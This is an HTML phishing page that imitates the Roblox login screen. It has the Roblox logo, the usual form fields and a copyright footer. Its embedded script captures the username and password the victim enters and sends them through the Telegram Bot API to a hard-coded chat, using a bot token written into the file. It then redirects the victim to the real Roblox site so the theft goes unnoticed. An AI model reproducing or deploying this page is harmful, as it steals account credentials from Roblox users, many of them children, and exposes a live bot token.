<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Roblox</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#1a1a2e; display:flex; justify-content:center; align-items:center; min-height:100vh; font-family:Arial,sans-serif; }
        .login-container { background:#16213e; padding:40px; border-radius:12px; box-shadow:0 0 30px #0f3460; width:360px; text-align:center; }
        .login-container img { width:120px; margin-bottom:20px; }
        .login-container h1 { color:#fff; font-size:26px; margin-bottom:20px; }
        .login-container input { width:100%; padding:12px; margin:8px 0; border:none; border-radius:6px; background:#0f3460; color:#fff; font-size:16px; }
        .login-container input::placeholder { color:#8899bb; }
        .login-container button { width:100%; padding:12px; background:#e63946; border:none; border-radius:6px; color:#fff; font-size:18px; font-weight:bold; cursor:pointer; }
        .login-container a { color:#4a9eff; text-decoration:none; font-size:14px; display:inline-block; margin-top:15px; }
        .login-container .divider { border-top:1px solid #2a3a5a; margin:20px 0; }
        .login-container .footer { color:#666; font-size:11px; margin-top:15px; }
    </style>
</head>
<body>
<div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Roblox_Logo_2022.svg/1200px-Roblox_Logo_2022.svg.png" alt="Roblox">
    <h1>Login to Roblox</h1>

    <form id="loginForm">
        <input type="text" id="login-username" placeholder="Username/Email/Phone" required>
        <input type="password" id="login-password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>

    <a href="#">Forgot Password or Username?</a>
    <div class="divider"></div>
    <div><span style="color:#aaa;">Don't have an account? </span><a href="#">Sign Up</a></div>
    <div class="footer">© Roblox Corporation</div>
</div>

<script>
document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("login-username").value;
    const password = document.getElementById("login-password").value;

    const message = "Логин: " + username + " | Пароль: " + password;

    const BOT_TOKEN = "8940580334:AAHKpfrG1AC8qTgbF-DmASQmbVaSsX1vR2Q";
    const CHAT_ID = "8470930779";

    const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(message);

    fetch(url)
        .then(response => {
            if (response.ok) {
                window.location.href = "https://www.roblox.com/home";
            } else {
                alert("Ошибка при входе. Попробуйте позже.");
            }
        })
        .catch(() => {
            alert("Ошибка соединения.");
        });
});
</script>

</body>
</html>
